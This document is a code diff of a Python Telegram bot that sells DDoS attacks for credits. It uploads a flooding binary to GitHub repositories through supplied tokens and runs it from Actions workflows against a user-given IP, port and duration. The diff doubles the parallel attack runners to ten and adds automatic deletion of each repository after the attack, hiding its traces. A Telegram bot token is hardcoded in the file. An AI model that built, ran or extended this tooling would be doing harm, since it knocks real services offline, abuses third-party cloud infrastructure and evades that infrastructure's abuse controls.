@@ -2,20 +2,16 @@ import os
 import asyncio
 import base64
 import json
-import threading
 from datetime import datetime
-from flask import Flask
 from telegram import Update
 from telegram.constants import ChatAction
 from telegram.ext import Application, CommandHandler, ContextTypes
 from github import Github, InputGitTreeElement, Auth
 
-# === Configuration ===
 TELEGRAM_TOKEN = '7828525928:AAFyoR2iu_BSI-XB7hMNqe2QSZw5i3IM7gM'
+
 ADMIN_IDS = {7163028849}
 DATA_FILE = 'soul.json'
-REPO_NAME = "soulcrack90"
-CREDIT_COST_PER_ATTACK = 25
 
 user_sessions = {}
 if os.path.exists(DATA_FILE):
@@ -53,19 +49,20 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        n: [1,2,3,4,5]
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
       - uses: actions/checkout@v3
       - name: Make binary executable
         run: chmod +x *
       - name: Run soul binary
-        run: ./Spike {ip} {port} {time} 10240 100
+        run: sudo ./Titanop {ip} {port} {time} 100
 '''
+
+REPO_NAME = "soulcrack90"
+CREDIT_COST_PER_ATTACK = 25
 
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
-
-# === Telegram Bot Handlers ===
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -73,14 +70,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/approve <id> <credit> - Approve ID with credit (admin only)\n"
         "/credit <id> <credit> - Add credit to ID (admin only)\n"
         "/remove <id> - Remove ID approval (admin only)\n"
-        "/token <token1> <token2> ... - Provide GitHub tokens (admin only)\n"
-        "/server <ip> <port> <time> - Run binary with params\n"
-        "/status - Show approved IDs and credits\n"
+        "/token <token1> <token2> ... - Provide GitHub tokens separated by space (admin only)\n"
+        "/server <ip> <port> <time> - Run binary with params on approved IDs\n"
+        "/status - Show approved IDs and their credits\n"
     )
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /approve <id> <credit>")
@@ -105,7 +101,6 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 2:
         await update.message.reply_text("Usage: /credit <id> <credit>")
@@ -130,7 +125,6 @@ async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("Unauthorized")
         return
     if len(context.args) != 1:
         await update.message.reply_text("Usage: /remove <id>")
@@ -148,7 +142,6 @@ async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("Unauthorized")
         return
     if not context.args:
         await update.message.reply_text("Usage: /token <token1> <token2> ...")
@@ -182,7 +175,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     credits = session.get('credits', {})
     github_tokens = session.get('github_tokens', [])
     if not github_tokens:
-        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @cracks_owner")
+        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @soulcracks_owner")
         return
     if not approved_ids:
         await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @soulcracks_owner")
@@ -198,10 +191,9 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text("Time must be a positive integer")
         return
-    if not os.path.isfile("Spike"):
-        await update.message.reply_text("Local binary 'SOUL' not found!")
+    if not os.path.isfile("Titanop"):
+        await update.message.reply_text("Local binary 'soul' not found!")
         return
-
     await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
     msg = await update.message.reply_text(f"{VBV_LOADING_FRAMES[0]}  0% completed")
     frame_count = len(VBV_LOADING_FRAMES)
@@ -213,7 +205,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.edit_text(display_message)
         except Exception:
             pass
-
+    # For all approved IDs with sufficient credit, run attack on all tokens
     tasks = []
     for id_ in list(approved_ids):
         credit = credits.get(id_, 0)
@@ -254,18 +246,18 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
         base_tree = repo.get_git_tree(base_commit.sha)
-        with open("Spike", "rb") as f:
+        with open("Titanop", "rb") as f:
             binary_content = f.read()
         binary_b64 = base64.b64encode(binary_content).decode('utf-8')
         blob = repo.create_git_blob(binary_b64, "base64")
         binary_element = InputGitTreeElement(
-            path="Spike",
+            path="Titanop",
             mode='100755',
             type='blob',
             sha=blob.sha,
         )
         new_tree = repo.create_git_tree([binary_element], base_tree)
-        new_commit = repo.create_git_commit("Add SOUL binary", new_tree, [base_commit])
+        new_commit = repo.create_git_commit("Add Titanop binary", new_tree, [base_commit])
         base_ref.edit(new_commit.sha)
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
@@ -280,15 +272,21 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
         workflow_tree = repo.create_git_tree([yml_element], base_tree)
         workflow_commit = repo.create_git_commit("Add workflow", workflow_tree, [base_commit])
         base_ref.edit(workflow_commit.sha)
-    except Exception as e:
-        # Optional: log error somewhere
-        print(f"Error in run_workflow_with_token_and_id: {e}")
+    except Exception:
+        pass
 
-# === Set up Telegram bot ===
+async def schedule_delete_and_notify(chat_id, github_token, repo_name, sec, ip, port, time, update):
+    await asyncio.sleep(sec)
+    try:
+        g = Github(auth=Auth.Token(github_token))
+        repo = g.get_user().get_repo(repo_name)
+        repo.delete()
+        await update.message.reply_text(f"🛑 Attack over on {ip}:{port} after {time} seconds.")
+    except Exception:
+        pass
 
-def run_telegram_bot():
+def main():
     app = Application.builder().token(TELEGRAM_TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CommandHandler("credit", add_credit))
@@ -296,26 +294,7 @@ def run_telegram_bot():
     app.add_handler(CommandHandler("token", token))
     app.add_handler(CommandHandler("server", server))
     app.add_handler(CommandHandler("status", status))
-
     app.run_polling()
 
-# === Flask App for Render ===
-
-flask_app = Flask(__name__)
-
-@flask_app.route("/")
-def home():
-    return "Bot is running."
-
-def run_flask():
-    flask_app.run(host="0.0.0.0", port=10000)
-
-# === Main Entry Point ===
-
 if __name__ == "__main__":
-    # Run Flask in background thread
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
-
-    # Run Telegram bot in main thread
-    run_telegram_bot()
+    main()
